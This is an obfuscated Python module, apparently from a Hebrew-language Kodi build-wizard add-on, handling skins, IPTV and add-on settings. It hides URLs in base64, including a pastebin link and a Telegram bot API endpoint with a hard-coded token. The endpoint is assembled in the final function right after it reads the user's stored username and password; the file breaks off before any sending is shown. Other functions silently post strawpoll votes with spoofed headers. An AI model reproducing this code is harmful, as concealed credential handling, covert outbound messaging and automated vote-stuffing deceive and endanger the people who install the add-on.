# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	OO00OOOO00OO0000O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	O0OO00OOO00O00OO0 =[];O0OOOOO0O000OO00O =[]#line:267
	for O0000O0OOOO0OOO0O in sorted (OO00OOOO00OO0000O ,key =lambda OOO00OO000OO0OOO0 :OOO00OO000OO0OOO0 ):#line:268
		O000OO0OO00O00O00 =os .path .split (O0000O0OOOO0OOO0O [:-1 ])[1 ]#line:269
		O0O0O0000000OO000 =os .path .join (O0000O0OOOO0OOO0O ,'addon.xml')#line:270
		if os .path .exists (O0O0O0000000OO000 ):#line:271
			O0O00000O0O000OOO =open (O0O0O0000000OO000 )#line:272
			O0O0O000OOOOOOO00 =O0O00000O0O000OOO .read ()#line:273
			OO0OOO0OOOO0OOO00 =parseDOM2 (O0O0O000OOOOOOO00 ,'addon',ret ='id')#line:274
			OOO0O00O0O00OOO0O =O000OO0OO00O00O00 if len (OO0OOO0OOOO0OOO00 )==0 else OO0OOO0OOOO0OOO00 [0 ]#line:275
			try :#line:276
				OOO0O00000OOOO000 =xbmcaddon .Addon (id =OOO0O00O0O00OOO0O )#line:277
				O0OO00OOO00O00OO0 .append (OOO0O00000OOOO000 .getAddonInfo ('name'))#line:278
				O0OOOOO0O000OO00O .append (OOO0O00O0O00OOO0O )#line:279
			except :#line:280
				pass #line:281
	O000OO0000O0O00O0 =[];OO00O000O00OO0O00 =0 #line:282
	OO0O0O0OO0OO00OOO =["Current Skin -- %s"%currSkin ()]+O0OO00OOO00O00OO0 #line:283
	OO00O000O00OO0O00 =DIALOG .select ("Select the Skin you want to swap with.",OO0O0O0OO0OO00OOO )#line:284
	if OO00O000O00OO0O00 ==-1 :return #line:285
	else :#line:286
		O0O0O000O000OOO0O =(OO00O000O00OO0O00 -1 )#line:287
		O000OO0000O0O00O0 .append (O0O0O000O000OOO0O )#line:288
		OO0O0O0OO0OO00OOO [OO00O000O00OO0O00 ]="%s"%(O0OO00OOO00O00OO0 [O0O0O000O000OOO0O ])#line:289
	if O000OO0000O0O00O0 ==None :return #line:290
	for O0O000000OOOO00O0 in O000OO0000O0O00O0 :#line:291
		swapSkins (O0OOOOO0O000OO00O [O0O000000OOOO00O0 ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (OOO0O000OOO0000O0 ,title ="Error"):#line:296
	OOOO0000OO0O0OOO0 ='lookandfeel.skin'#line:297
	OO0O0000000O00OO0 =OOO0O000OOO0000O0 #line:298
	O000000OO00OOO0O0 =getOld (OOOO0000OO0O0OOO0 )#line:299
	O00O0O0OOOOO0O00O =OOOO0000OO0O0OOO0 #line:300
	setNew (O00O0O0OOOOO0O00O ,OO0O0000000O00OO0 )#line:301
	O0OO00000OO00OO00 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OO00000OO00OO00 <100 :#line:303
		O0OO00000OO00OO00 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (OO0OO000O0000O0O0 ):#line:310
	try :#line:311
		OO0OO000O0000O0O0 ='"%s"'%OO0OO000O0000O0O0 #line:312
		O0OO0000000OO00O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO0OO000O0000O0O0 )#line:313
		OOOO000OO0OOO000O =xbmc .executeJSONRPC (O0OO0000000OO00O0 )#line:315
		OOOO000OO0OOO000O =simplejson .loads (OOOO000OO0OOO000O )#line:316
		if OOOO000OO0OOO000O .has_key ('result'):#line:317
			if OOOO000OO0OOO000O ['result'].has_key ('value'):#line:318
				return OOOO000OO0OOO000O ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (OOO0O0O0O0OOO000O ,O000OO0O0OO00O0O0 ):#line:325
	try :#line:326
		OOO0O0O0O0OOO000O ='"%s"'%OOO0O0O0O0OOO000O #line:327
		O000OO0O0OO00O0O0 ='"%s"'%O000OO0O0OO00O0O0 #line:328
		OO00OOOO00OO0O00O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO0O0O0O0OOO000O ,O000OO0O0OO00O0O0 )#line:329
		O0O0O000O0O000O00 =xbmc .executeJSONRPC (OO00OOOO00OO0O00O )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			O0OO0O0O0OOO0O0O0 =xbmcgui .DialogProgress ()#line:340
			O0OO0O0O0OOO0O0O0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			O0OO0O0O0OOO0O0O0 .update (0 )#line:344
			for O0000OO00OOO0OO00 in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				O0OO0O0O0OOO0O0O0 .update (int ((5 -O0000OO00OOO0OO00 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0000OO00OOO0OO00 ),'')#line:347
				if O0OO0O0O0OOO0O0O0 .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			O0OO0O0O0OOO0O0O0 =xbmcgui .DialogProgress ()#line:353
			O0OO0O0O0OOO0O0O0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			O0OO0O0O0OOO0O0O0 .update (0 )#line:357
			for O0000OO00OOO0OO00 in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				O0OO0O0O0OOO0O0O0 .update (int ((5 -O0000OO00OOO0OO00 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0000OO00OOO0OO00 ),'')#line:360
				if O0OO0O0O0OOO0O0O0 .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    OOO000000000O0OOO ='18773068'#line:373
    O0O00O0OOO0O0O0O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO000000000O0OOO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    O00OOOOOOOO0O00OO ='145273320'#line:387
    OOO00O000O0O00OOO ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        O0O00O00OOO000O0O =O00OOOOOOOO0O00OO #line:390
    else :#line:391
        O0O00O00OOO000O0O =OOO00O000O0O00OOO #line:392
    O0OO0O0O00O000OOO ={'options':O0O00O00OOO000O0O }#line:396
    OOO0O00O000OO0O00 =requests .post ('https://www.strawpoll.me/'+OOO000000000O0OOO ,headers =O0O00O0OOO0O0O0O0 ,data =O0OO0O0O00O000OOO )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        O0OOO0OO00O0O00OO ='18773068'#line:402
        OOO0OOO000O00O0OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOO0OO00O0O00OO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        O000OO000000O0O00 ='145273320'#line:416
        OOO00O00O00OO000O ={'options':O000OO000000O0O00 }#line:422
        O000O0O0O00OO00OO =requests .post ('https://www.strawpoll.me/'+O0OOO0OO00O0O00OO ,headers =OOO0OOO000O00O0OO ,data =OOO00O00O00OO000O )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        O00OOOO00000OOO0O ='18773068'#line:429
        O0O00OO0O00O00O00 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OOOO00000OOO0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        OO00O00OO00OOOO0O ='145273321'#line:443
        OOO00OOOO0OOO0OOO ={'options':OO00O00OO00OOOO0O }#line:449
        O0OO0O00O0O0OO0OO =requests .post ('https://www.strawpoll.me/'+O00OOOO00000OOO0O ,headers =O0O00OO0O00O00O00 ,data =OOO00OOOO0OOO0OOO )#line:451
   except :pass #line:452
def testcommand ():#line:456
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.telemedia')):#line:457
		O0OOO0O0O0OOO0O0O =xbmcaddon .Addon ('plugin.video.telemedia')#line:458
	if os .path .exists (os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","plugin.video.telemedia/database","td.binlog")):#line:459
		O0OOO0O0O0OOO0O0O .setSetting ('autologin','true')#line:460
def skin_homeselect ():#line:461
	try :#line:463
		O00O0000OO0O00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:464
		OO0OO000OOO0OOOO0 =open (O00O0000OO0O00OO0 ,'r')#line:466
		O000O00000O0O0OOO =OO0OO000OOO0OOOO0 .read ()#line:467
		OO0OO000OOO0OOOO0 .close ()#line:468
		O0OOOO0O0OOO0O0OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:469
		O00O0O0OO0OO0OO00 =re .compile (O0OOOO0O0OOO0O0OO ).findall (O000O00000O0O0OOO )[0 ]#line:470
		OO0OO000OOO0OOOO0 =open (O00O0000OO0O00OO0 ,'w')#line:471
		OO0OO000OOO0OOOO0 .write (O000O00000O0O0OOO .replace ('<setting id="HomeS" type="string%s/setting>'%O00O0O0OO0OO0OO00 ,'<setting id="HomeS" type="string"></setting>'))#line:472
		OO0OO000OOO0OOOO0 .close ()#line:473
	except :#line:474
		pass #line:475
def autotrakt ():#line:478
    OO000OO0OO0OO000O =(ADDON .getSetting ("auto_trk"))#line:479
    if OO000OO0OO0OO000O =='true':#line:480
       from resources .libs import trk_aut #line:481
def traktsync ():#line:483
     O0OO00OOO00OOOOO0 =(ADDON .getSetting ("auto_trk"))#line:484
     if O0OO00OOO00OOOOO0 =='true':#line:485
       from resources .libs import trk_aut #line:488
     else :#line:489
        ADDON .openSettings ()#line:490
def imdb_synck ():#line:492
   try :#line:493
     O00000OOO0OOO0O0O =xbmcaddon .Addon ('plugin.video.exodusredux')#line:494
     O0OOO0O00O00OO000 =xbmcaddon .Addon ('plugin.video.gaia')#line:495
     OO00OOO00O00OO000 =(ADDON .getSetting ("imdb_sync"))#line:496
     O0OOOO00OOOOO0O0O ="imdb.user"#line:497
     OOO0OOO0O0O0000OO ="accounts.informants.imdb.user"#line:498
     O00000OOO0OOO0O0O .setSetting (O0OOOO00OOOOO0O0O ,str (OO00OOO00O00OO000 ))#line:499
     O0OOO0O00O00OO000 .setSetting ('accounts.informants.imdb.enabled','true')#line:500
     O0OOO0O00O00OO000 .setSetting (OOO0OOO0O0O0000OO ,str (OO00OOO00O00OO000 ))#line:501
   except :pass #line:502
def dis_or_enable_addon (OOOOO00O0O000O0O0 ,OOOO00O0OO0O0OOOO ,enable ="true"):#line:504
    import json #line:505
    OO00O0O000OOOOO00 ='"%s"'%OOOOO00O0O000O0O0 #line:506
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOOO00O0O000O0O0 )and enable =="true":#line:507
        logging .warning ('already Enabled')#line:508
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOOO00O0O000O0O0 )#line:509
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOOO00O0O000O0O0 )and enable =="false":#line:510
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOOO00O0O000O0O0 )#line:511
    else :#line:512
        OOOO0O00000OO00O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO00O0O000OOOOO00 ,enable )#line:513
        O0O0O00OO00O0O00O =xbmc .executeJSONRPC (OOOO0O00000OO00O0 )#line:514
        OO0O0OOO00O000O0O =json .loads (O0O0O00OO00O0O00O )#line:515
        if enable =="true":#line:516
            xbmc .log ("### Enabled %s, response = %s"%(OOOOO00O0O000O0O0 ,OO0O0OOO00O000O0O ))#line:517
        else :#line:518
            xbmc .log ("### Disabled %s, response = %s"%(OOOOO00O0O000O0O0 ,OO0O0OOO00O000O0O ))#line:519
    if OOOO00O0OO0O0OOOO =='auto':#line:520
     return True #line:521
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:522
def iptvset ():#line:525
  try :#line:526
    OO00O00O0OOOO000O =(ADDON .getSetting ("iptv_on"))#line:527
    if OO00O00O0OOOO000O =='true':#line:529
       if KODIV >=17 and KODIV <18 :#line:531
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:532
         OOO0OO000000OO00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:533
         OO000OO0OOO0O000O =(ADDON .getSetting ("iptvUrl"))#line:535
         OOO0OO000000OO00O .setSetting ('m3uUrl',OO000OO0OOO0O000O )#line:536
         OOOO00O000O0O0OOO =(ADDON .getSetting ("epg_Url"))#line:537
         OOO0OO000000OO00O .setSetting ('epgUrl',OOOO00O000O0O0OOO )#line:538
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:541
         iptvsimpldownpc ()#line:542
         wiz .kodi17Fix ()#line:543
         xbmc .sleep (1000 )#line:544
         OOO0OO000000OO00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:545
         OO000OO0OOO0O000O =(ADDON .getSetting ("iptvUrl"))#line:546
         OOO0OO000000OO00O .setSetting ('m3uUrl',OO000OO0OOO0O000O )#line:547
         OOOO00O000O0O0OOO =(ADDON .getSetting ("epg_Url"))#line:548
         OOO0OO000000OO00O .setSetting ('epgUrl',OOOO00O000O0O0OOO )#line:549
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:551
         iptvsimpldown ()#line:552
         wiz .kodi17Fix ()#line:553
         xbmc .sleep (1000 )#line:554
         OOO0OO000000OO00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:555
         OO000OO0OOO0O000O =(ADDON .getSetting ("iptvUrl"))#line:556
         OOO0OO000000OO00O .setSetting ('m3uUrl',OO000OO0OOO0O000O )#line:557
         OOOO00O000O0O0OOO =(ADDON .getSetting ("epg_Url"))#line:558
         OOO0OO000000OO00O .setSetting ('epgUrl',OOOO00O000O0O0OOO )#line:559
  except :pass #line:560
def howsentlog ():#line:567
       try :#line:568
          import json #line:569
          OO000OO00O00000OO =(ADDON .getSetting ("user"))#line:570
          OO00OOOO0O000OOO0 =(ADDON .getSetting ("pass"))#line:571
          O00O0O00O000O0O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:572
          OO00OOOO0OOO00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:574
